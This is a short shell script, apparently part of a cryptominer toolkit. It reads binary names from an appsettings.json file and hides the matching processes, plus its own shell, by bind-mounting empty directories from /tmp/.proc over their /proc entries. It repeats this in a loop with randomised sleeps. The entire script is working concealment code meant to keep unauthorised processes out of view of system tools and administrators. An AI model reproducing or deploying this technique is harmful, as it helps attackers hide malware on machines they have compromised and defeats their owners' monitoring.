#!/bin/sh

work="${1:-}"
dynamicInterval="5"

hPid() {
  [ -n "$1" ] && [ -d "/proc/$1" ] && [ ! -d "/tmp/.proc/$1" ] && mkdir -p "/tmp/.proc/$1" && mount -o bind "/tmp/.proc/$1" "/proc/$1" && return 0 || return 1
}

gPid() {
  [ -n "$1" ] && [ -e "$1" ] && echo -n `fuser "$1" 2>/dev/null |grep -o '[0-9]\+'` || echo -n ""
}

[ -f "${work}/appsettings.json" ] || exit 1
tName=`cat "${work}/appsettings.json" |grep '"cpuName":' |cut -d'"' -f4`
xName=`cat "${work}/appsettings.json" |grep '"binaryName":' |cut -d'"' -f4`
hPid `gPid "${work}/bash"`
hPid "$$"

while true; do
  hPid `gPid "${work}/${tName}"`
  hPid `gPid "${work}/${xName}"`
  rTime="$((`od -An -N2 -i /dev/urandom` % dynamicInterval))" && sleep "$((rTime + dynamicInterval))" || sleep "$dynamicInterval";
done

exit 0
